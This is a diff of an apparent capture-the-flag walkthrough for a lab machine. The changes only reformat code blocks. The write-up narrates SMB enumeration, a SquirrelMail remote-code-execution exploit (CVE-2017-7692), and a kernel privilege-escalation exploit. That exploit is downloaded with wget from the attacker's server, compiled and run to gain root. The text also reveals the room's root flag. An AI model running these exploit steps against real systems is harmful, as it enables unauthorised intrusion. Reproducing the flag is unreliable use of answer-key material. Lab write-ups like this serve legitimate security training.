@@ -101,13 +101,13 @@ Success! We managed to login to the SMB server, let's see what files are availab
 ```ls```<br />
 SCREENSHOT11<br />
 Nothing really stands out to us here except from the directory "notes" Let's change our directory and list what's inside.<br />
-```cd notes<br />
-ls```<br />
+```cd notes```<br />
+```ls```<br />
 SCREENSHOT12<br />
 There's an interesting file amongst all of the random files, let's download and take a look at "important.txt"<br />
-```get important.txt<br />
-exit<br />
-cat important.txt```<br />
+```get important.txt```<br />
+```exit```<br />
+```cat important.txt```<br />
 SCREENSHOT13<br />
 Oooh! An interesting find... It looks like a directory on the webserver. It's probably the answer to our second question!
 Question 2:<br />
@@ -118,8 +118,8 @@ The answer was Remote File Inclusion but we found an exploit for Remote File Exe
 Let's try to exploit the vulnerability we found with the exploit CVE-2017-7692. <br />
 The exploit I will be using for this can be located here: https://legalhackers.com/advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html <br />
 Firstly I download the exploit and save it as exploit.sh in my /root directory (THM AttackBox Default Terminal Directory). We need to change the permissions of the file BEFORE executing it.<br />
-```chmod +x exploit.sh<br />
-./exploit.sh http://10.10.90.192/squirrelmail```<br />
+```chmod +x exploit.sh```<br />
+```./exploit.sh http://10.10.90.192/squirrelmail```<br />
 Enter the username and password for the squirrelmail service.<br />
 SCREENSHOT14<br />
 Something went wrong... We'll come back to this exploit later and see if we can figure out what went wrong. 
@@ -169,21 +169,21 @@ Since the shell we got isn't very stable, let's use Python to help that.<br />
 ```python -c 'import pty;pty.spawn("/bin/bash")'<br />```
 SCREENSHOT20<br />
 Alright! Let's see what we can do about escalating our privileges, I'll start first by checking what kernel they are using.<br />
-uname -a<br />
+```uname -a```<br />
 SCREENSHOT21<br />
 We can see the kernel version is 4.8.0-58-generic, let's have a look for exploits in that kernel version. 
 Good news! We can see on exploit-db with a little research that it is vulnerable - https://www.exploit-db.com/exploits/43418<br />
 Let's download the exploit on the target machine, we'll have to download it on our attacker machine first then serve it through 
 the python HTTP server we set up earlier.<br />
 Once you have downloaded the exploit and saved it in the same directory as your web server is running... Change your target machines directory to a place you have write permissions I used /tmp<br />
-wget http://10.10.113.195:8000/priv.c<br />
-chmod +x priv.c<br />
-gcc priv.c -o priv<br />
-./priv<br />
+```wget http://10.10.113.195:8000/priv.c```<br />
+```chmod +x priv.c```<br />
+```gcc priv.c -o priv```<br />
+```./priv```<br />
 SCREENSHOT22<br />
 SUCCESS! We have root, all we have to do now is find the root flag and we're done!<br />
-cd /root<br />
-cat root.txt<br />
+```cd /root```<br />
+```cat root.txt```<br />
 SCREENSHOT23<br />
 Question 5:<br />
 **What is the root flag?** 7ce5c2109a40f958099283600a9ae807<br />
